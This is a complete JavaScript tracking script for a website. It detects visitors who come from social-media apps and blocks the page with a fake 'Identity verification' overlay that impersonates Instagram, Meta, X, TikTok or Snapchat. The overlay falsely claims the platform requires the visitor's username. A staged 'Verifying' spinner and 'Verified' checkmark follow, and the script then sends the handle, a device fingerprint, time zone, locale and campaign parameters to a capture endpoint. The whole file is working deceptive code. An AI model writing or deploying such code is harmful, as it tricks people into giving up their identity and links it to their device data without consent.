(function () {
  'use strict';

  var CAPTURE_URL = '/.netlify/functions/capture';
  var SESSION_KEY = 'ig_tracker_session';
  var HANDLE_KEY = 'ig_tracker_handle';

  // ── Session ID ──────────────────────────────────────────────
  var sessionId = sessionStorage.getItem(SESSION_KEY);
  if (!sessionId) {
    sessionId = typeof crypto !== 'undefined' && crypto.randomUUID
      ? crypto.randomUUID()
      : 'xxxx-xxxx-xxxx'.replace(/x/g, function () {
          return ((Math.random() * 16) | 0).toString(16);
        });
    sessionStorage.setItem(SESSION_KEY, sessionId);
  }

  var SENT_KEY = 'ig_tracker_sent_' + sessionId;

  // ── Social Media Platform Configs ─────────────────────────
  var PLATFORMS = {
    instagram: {
      name: 'Instagram',
      gradient: 'linear-gradient(45deg, #833AB4, #C13584, #E1306C, #F56040, #FCAF45)',
      logoColor: 'linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)',
      icon: '<svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>',
      prefix: '@',
      placeholder: 'username',
      validation: /^[a-zA-Z0-9._]{1,30}$/,
      errorMsg: 'Enter a valid Instagram username',
      verifyMsg: 'Instagram requires identity verification to view external links'
    },
    facebook: {
      name: 'Facebook',
      gradient: 'linear-gradient(45deg, #1877F2, #42A5F5)',
      logoColor: '#1877F2',
      icon: '<svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>',
      prefix: '',
      placeholder: 'name or profile URL',
      validation: /^.{2,}$/,
      errorMsg: 'Enter your Facebook name or profile URL',
      verifyMsg: 'Meta requires identity verification to view external links'
    },
    twitter: {
      name: 'X (Twitter)',
      gradient: 'linear-gradient(45deg, #000000, #333333)',
      logoColor: '#000000',
      icon: '<svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>',
      prefix: '@',
      placeholder: 'username',
      validation: /^[a-zA-Z0-9_]{1,15}$/,
      errorMsg: 'Enter a valid X/Twitter username',
      verifyMsg: 'X requires identity verification to view external links'
    },
    tiktok: {
      name: 'TikTok',
      gradient: 'linear-gradient(45deg, #010101, #69C9D0, #EE1D52)',
      logoColor: 'linear-gradient(45deg, #69C9D0, #EE1D52)',
      icon: '<svg viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg>',
      prefix: '@',
      placeholder: 'username',
      validation: /^[a-zA-Z0-9._]{2,24}$/,
      errorMsg: 'Enter a valid TikTok username',
      verifyMsg: 'TikTok requires identity verification to view external links'
    },
    snapchat: {
      name: 'Snapchat',
      gradient: 'linear-gradient(45deg, #FFFC00, #FFE600)',
      logoColor: '#FFFC00',
      icon: '<svg viewBox="0 0 24 24"><path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.076-.491-.103-1.139-.224-2.03-.224-.209 0-.42.015-.614.045-.779.104-1.455.511-2.249.99-.96.585-2.055 1.243-3.584 1.243l-.135-.003-.135.003c-1.524 0-2.625-.658-3.584-1.243-.793-.48-1.469-.886-2.249-.99-.195-.029-.405-.045-.615-.045-.884 0-1.539.12-2.03.224-.226.044-.404.076-.539.076-.24 0-.449-.12-.539-.39-.061-.194-.105-.375-.135-.554-.045-.194-.105-.479-.165-.57-1.872-.283-2.92-.701-3.146-1.271-.029-.075-.044-.149-.044-.225-.015-.24.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.659-1.332-.809-.135-.045-.254-.086-.345-.12-.42-.164-.644-.314-.779-.465-.104-.134-.166-.285-.166-.449 0-.375.301-.72.795-.869.149-.044.314-.074.48-.074.09 0 .3.015.45.09.375.18.72.289 1.02.301.22 0 .359-.06.42-.09-.008-.165-.018-.33-.03-.51l-.003-.06c-.105-1.628-.23-3.654.3-4.847C7.86 1.069 11.216.793 12.206.793z"/></svg>',
      prefix: '',
      placeholder: 'username',
      validation: /^[a-zA-Z0-9._-]{3,15}$/,
      errorMsg: 'Enter a valid Snapchat username',
      verifyMsg: 'Snapchat requires identity verification to view external links',
      btnText: '#000'
    }
  };

  // ── Instagram UA Parser ───────────────────────────────────
  function parseInstagramUA(ua) {
    var igMatch = ua.match(/Instagram\s+([\d.]+)/);
    if (!igMatch) return null;

    var info = { appVersion: igMatch[1] };

    var iosMatch = ua.match(
      /Instagram\s+[\d.]+\s+\(([^;]+);\s*iOS\s+([^;]+);\s*([^;]+);\s*([^;]+);\s*scale=([\d.]+);\s*(\d+x\d+)/
    );
    if (iosMatch) {
      info.deviceModel = iosMatch[1];
      info.osVersion = iosMatch[2];
      info.locale = iosMatch[3].trim();
      info.scale = parseFloat(iosMatch[5]);
      info.nativeResolution = iosMatch[6];
    }

    var androidMatch = ua.match(
      /Instagram\s+[\d.]+\s+Android\s+\((\d+)\/([\d.]+);\s*(\d+)dpi;\s*(\d+x\d+);\s*([^;]+);\s*([^;)]+)/
    );
    if (androidMatch) {
      info.osVersion = androidMatch[2];
      info.nativeResolution = androidMatch[4];
      info.manufacturer = androidMatch[5].trim();
      info.deviceModel = androidMatch[6].trim();
    }

    return info;
  }

  // ── Detect which social in-app browser ────────────────────
  function detectInAppBrowser(ua) {
    if (/Instagram/i.test(ua)) return 'instagram';
    if (/FBAN|FBAV/i.test(ua)) return 'facebook';
    if (/LinkedIn/i.test(ua)) return 'linkedin';
    if (/Twitter|TwitterAndroid/i.test(ua)) return 'twitter';
    if (/BytedanceWebview|TikTok/i.test(ua)) return 'tiktok';
    if (/Snapchat/i.test(ua)) return 'snapchat';
    return null;
  }

  function detectSocialVisitor() {
    var ua = navigator.userAgent || '';
    var browser = detectInAppBrowser(ua);
    if (browser) return browser;

    var params = new URLSearchParams(window.location.search);
    var utmSource = (params.get('utm_source') || '').toLowerCase();
    if (utmSource === 'ig' || utmSource === 'instagram') return 'instagram';
    if (utmSource === 'fb' || utmSource === 'facebook') return 'facebook';
    if (utmSource === 'li' || utmSource === 'linkedin') return 'linkedin';
    if (utmSource === 'tw' || utmSource === 'twitter' || utmSource === 'x') return 'twitter';
    if (utmSource === 'tt' || utmSource === 'tiktok') return 'tiktok';
    if (utmSource === 'sc' || utmSource === 'snapchat') return 'snapchat';

    var ref = (document.referrer || '').toLowerCase();
    if (ref.indexOf('instagram.com') !== -1) return 'instagram';
    if (ref.indexOf('facebook.com') !== -1 || ref.indexOf('fb.com') !== -1) return 'facebook';
    if (ref.indexOf('linkedin.com') !== -1) return 'linkedin';
    if (ref.indexOf('twitter.com') !== -1 || ref.indexOf('x.com') !== -1 || ref.indexOf('t.co') !== -1) return 'twitter';
    if (ref.indexOf('tiktok.com') !== -1) return 'tiktok';
    if (ref.indexOf('snapchat.com') !== -1) return 'snapchat';

    return null;
  }

  // ── URL Parameters ────────────────────────────────────────
  function getUrlParams() {
    var params = new URLSearchParams(window.location.search);
    return {
      utmSource: params.get('utm_source') || null,
      utmMedium: params.get('utm_medium') || null,
      utmContent: params.get('utm_content') || null,
      utmCampaign: params.get('utm_campaign') || null,
      fbclid: params.get('fbclid') || null
    };
  }

  // ── Device Data ───────────────────────────────────────────
  function collectDeviceData() {
    return {
      screenWidth: screen.width,
      screenHeight: screen.height,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      platform: navigator.platform || null,
      vendor: navigator.vendor || null,
      languages: navigator.languages ? Array.prototype.slice.call(navigator.languages) : [navigator.language],
      cookiesEnabled: navigator.cookieEnabled
    };
  }

  // ── Client-Side Geo ───────────────────────────────────────
  function collectGeoData() {
    var tz = null;
    try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
    var locale = null;
    try { locale = Intl.DateTimeFormat().resolvedOptions().locale; } catch (e) {}
    return { timezone: tz, timezoneOffset: new Date().getTimezoneOffset(), locale: locale };
  }

  // ── Build Payload ─────────────────────────────────────────
  function buildPayload(socialHandle, platform) {
    var ua = navigator.userAgent || '';
    var urlParams = getUrlParams();
    var igData = parseInstagramUA(ua);

    var payload = {
      sessionId: sessionId,
      type: 'initial',
      timestamp: new Date().toISOString(),
      socialHandle: socialHandle || null,
      socialPlatform: platform || null,

      page: {
        url: window.location.href,
        path: window.location.pathname,
        title: document.title,
        referrer: document.referrer || null,
        utmSource: urlParams.utmSource,
        utmMedium: urlParams.utmMedium,
        utmContent: urlParams.utmContent,
        utmCampaign: urlParams.utmCampaign,
        fbclid: urlParams.fbclid
      },

      device: collectDeviceData(),
      geo: collectGeoData(),
      inAppBrowser: detectInAppBrowser(ua),
      userAgent: ua
    };

    if (igData) {
      payload.instagram = {
        isInstagram: true,
        appVersion: igData.appVersion,
        deviceModel: igData.deviceModel || null,
        osVersion: igData.osVersion || null,
        locale: igData.locale || null,
        scale: igData.scale || null,
        nativeResolution: igData.nativeResolution || null,
        manufacturer: igData.manufacturer || null
      };
    }

    return payload;
  }

  // ── Send Data ─────────────────────────────────────────────
  function sendPayload(payload) {
    try {
      fetch(CAPTURE_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(function () {});
    } catch (e) {}
  }

  // ── Dismiss Gate ──────────────────────────────────────────
  function dismissGate(overlay, scrollY) {
    overlay.classList.add('ig-gate-hidden');
    document.body.classList.remove('ig-gate-locked');
    document.body.style.top = '';
    window.scrollTo(0, scrollY);
    setTimeout(function () {
      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }, 300);
  }

  // ── Wait for user interaction before showing gate ─────────
  function waitForInteraction(callback) {
    var triggered = false;
    function trigger() {
      if (triggered) return;
      triggered = true;
      document.removeEventListener('scroll', trigger);
      document.removeEventListener('click', trigger);
      setTimeout(callback, 200);
    }
    document.addEventListener('scroll', trigger, { passive: true });
    document.addEventListener('click', trigger);
    // Fallback: auto-show after 8s if no interaction
    setTimeout(trigger, 8000);
  }

  // ── Social Gate (multi-state: input → verifying → confirmed) ──
  function showSocialGate(platformKey) {
    var existing = sessionStorage.getItem(HANDLE_KEY);
    if (existing && existing !== '__skipped__') {
      sendPayload(buildPayload(existing, platformKey));
      return;
    }

    var cfg = PLATFORMS[platformKey];
    if (!cfg) return;

    var scrollY = window.pageYOffset;
    document.body.classList.add('ig-gate-locked');
    document.body.style.top = '-' + scrollY + 'px';

    var overlay = document.createElement('div');
    overlay.className = 'ig-gate-overlay';
    var card = document.createElement('div');
    card.className = 'ig-gate-card';
    overlay.appendChild(card);
    document.body.appendChild(overlay);

    var verifyGen = 0;
    var logoHtml = '<div class="ig-gate-logo" style="background:' + cfg.logoColor + '">' + cfg.icon + '</div>';
    var btnColor = cfg.btnText ? 'color:' + cfg.btnText + ';' : '';

    // ── State: Username input ──
    function renderInput() {
      verifyGen++;
      card.innerHTML =
        logoHtml +
        '<h2 class="ig-gate-title">Identity verification</h2>' +
        '<p class="ig-gate-subtitle">' + cfg.verifyMsg + '</p>' +
        '<div class="ig-gate-input-wrapper">' +
        (cfg.prefix ? '<span class="ig-gate-at">' + cfg.prefix + '</span>' : '') +
        '<input class="ig-gate-input" type="text" placeholder="' + cfg.placeholder + '" autocomplete="off" autocapitalize="none" spellcheck="false"' +
        (cfg.prefix ? '' : ' style="padding-left:14px"') + '>' +
        '</div>' +
        '<button class="ig-gate-btn" style="background:' + cfg.gradient + ';' + btnColor + '" disabled>Continue</button>' +
        '<div class="ig-gate-error"></div>';

      var input = card.querySelector('.ig-gate-input');
      var btn = card.querySelector('.ig-gate-btn');
      var errorEl = card.querySelector('.ig-gate-error');

      input.addEventListener('input', function () {
        btn.disabled = input.value.replace(/^@/, '').trim().length === 0;
        errorEl.textContent = '';
      });

      function submit() {
        var handle = input.value.replace(/^@/, '').trim();
        if (!handle) { errorEl.textContent = 'Please enter your username'; return; }
        if (!cfg.validation.test(handle)) { errorEl.textContent = cfg.errorMsg; return; }
        renderVerifying(handle);
      }

      btn.addEventListener('click', submit);
      input.addEventListener('keydown', function (e) { if (e.key === 'Enter') submit(); });
      setTimeout(function () { input.focus(); }, 100);
    }

    // ── State: Verifying spinner ──
    function renderVerifying(handle) {
      var myGen = verifyGen;
      card.innerHTML =
        logoHtml +
        '<h2 class="ig-gate-title">Verifying</h2>' +
        '<div class="ig-gate-spinner"></div>' +
        '<p class="ig-gate-status">Checking ' + cfg.prefix + handle + '</p>';

      setTimeout(function () {
        if (myGen !== verifyGen) return;
        renderConfirmation(handle);
      }, 1500);
    }

    // ── State: "Is this you?" with initial-letter avatar ──
    function renderConfirmation(handle) {
      var initial = handle.charAt(0).toUpperCase();
      card.innerHTML =
        '<div class="ig-gate-avatar ig-gate-initial" style="background:' + cfg.gradient + '"><span>' + initial + '</span></div>' +
        '<h2 class="ig-gate-title">Is this you?</h2>' +
        '<p class="ig-gate-handle">' + cfg.prefix + handle + '</p>' +
        '<button class="ig-gate-btn" style="background:' + cfg.gradient + ';' + btnColor + '">Yes, that\'s me</button>' +
        '<button class="ig-gate-retry">Not me</button>';

      card.querySelector('.ig-gate-btn').addEventListener('click', function () {
        renderVerified(handle);
      });
      card.querySelector('.ig-gate-retry').addEventListener('click', renderInput);
    }

    // ── State: Verified checkmark + auto-dismiss ──
    function renderVerified(handle) {
      card.innerHTML =
        '<div class="ig-gate-check">' +
        '<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>' +
        '</div>' +
        '<h2 class="ig-gate-title" style="color:#2ECC71">Verified</h2>' +
        '<p class="ig-gate-status">' + cfg.prefix + handle + '</p>';

      sessionStorage.setItem(HANDLE_KEY, handle);
      sessionStorage.setItem(SENT_KEY, '1');
      sendPayload(buildPayload(handle, platformKey));
      setTimeout(function () { dismissGate(overlay, scrollY); }, 1000);
    }

    // Start with the input form
    renderInput();
  }

  // ── Initialize ────────────────────────────────────────────
  function init() {
    if (sessionStorage.getItem(SENT_KEY)) return;

    var platform = detectSocialVisitor();
    if (platform && PLATFORMS[platform]) {
      waitForInteraction(function () {
        showSocialGate(platform);
      });
    } else {
      sessionStorage.setItem(SENT_KEY, '1');
      sendPayload(buildPayload(null, null));
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
